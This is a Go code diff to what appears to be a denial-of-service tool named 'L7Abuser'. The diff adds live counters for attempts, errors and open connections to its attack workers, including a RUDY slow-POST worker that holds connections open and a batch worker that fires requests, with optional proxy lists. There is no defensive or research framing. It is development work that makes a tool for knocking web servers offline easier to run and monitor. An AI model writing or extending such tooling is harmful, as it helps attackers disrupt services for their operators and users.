@@ -15,6 +15,13 @@ import (
 	"github.com/kjsst/sh-mvdos/internal/worker/proxy"
 )
 
+// ProgressSink receives live counters for dashboard metrics.
+type ProgressSink struct {
+	Attempts        *atomic.Uint64
+	Errors          *atomic.Uint64
+	OpenConnections *atomic.Uint64
+}
+
 type L7Abuser struct {
 	Target    string
 	Workers   int
@@ -23,6 +30,7 @@ type L7Abuser struct {
 	Mode      string
 	CMS       string
 	ProxyFile string // optional path to proxy list (Slayer -p parity)
+	Progress  *ProgressSink
 }
 
 func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
@@ -43,6 +51,17 @@ func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
 	}
 
 	var reqs, errs atomic.Uint64
+	if w.Progress != nil {
+		if w.Progress.Attempts != nil {
+			w.Progress.Attempts.Store(0)
+		}
+		if w.Progress.Errors != nil {
+			w.Progress.Errors.Store(0)
+		}
+		if w.Progress.OpenConnections != nil {
+			w.Progress.OpenConnections.Store(0)
+		}
+	}
 	done := make(chan struct{}, w.Workers)
 
 	for i := 0; i < w.Workers; i++ {
@@ -65,6 +84,28 @@ func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
 	return reqs.Load(), errs.Load(), ctx.Err()
 }
 
+func (w *L7Abuser) addAttempt() {
+	if w.Progress != nil && w.Progress.Attempts != nil {
+		w.Progress.Attempts.Add(1)
+	}
+}
+
+func (w *L7Abuser) addError() {
+	if w.Progress != nil && w.Progress.Errors != nil {
+		w.Progress.Errors.Add(1)
+	}
+}
+
+func (w *L7Abuser) trackOpen(delta int64) {
+	if w.Progress != nil && w.Progress.OpenConnections != nil {
+		if delta > 0 {
+			w.Progress.OpenConnections.Add(uint64(delta))
+		} else {
+			w.Progress.OpenConnections.Add(^uint64(-delta - 1))
+		}
+	}
+}
+
 // runRudyWorker matches Slayer: one slow POST holds a connection until it ends, then retry.
 func (w *L7Abuser) runRudyWorker(ctx context.Context, client *http.Client, reqs, errs *atomic.Uint64) {
 	for {
@@ -73,10 +114,15 @@ func (w *L7Abuser) runRudyWorker(ctx context.Context, client *http.Client, reqs,
 			return
 		default:
 		}
-		if err := httpRudy(ctx, w.targetURL(), client); err != nil {
+		w.trackOpen(1)
+		err := httpRudy(ctx, w.targetURL(), client)
+		w.trackOpen(-1)
+		if err != nil {
 			errs.Add(1)
+			w.addError()
 		} else {
 			reqs.Add(1)
+			w.addAttempt()
 		}
 	}
 }
@@ -105,8 +151,10 @@ func (w *L7Abuser) runBatchWorker(ctx context.Context, mode string, workerID int
 					defer wg.Done()
 					if err := w.fireOnce(ctx, mode, workerID, seq, client); err != nil {
 						errs.Add(1)
+						w.addError()
 					} else {
 						reqs.Add(1)
+						w.addAttempt()
 					}
 				}(seq)
 			}
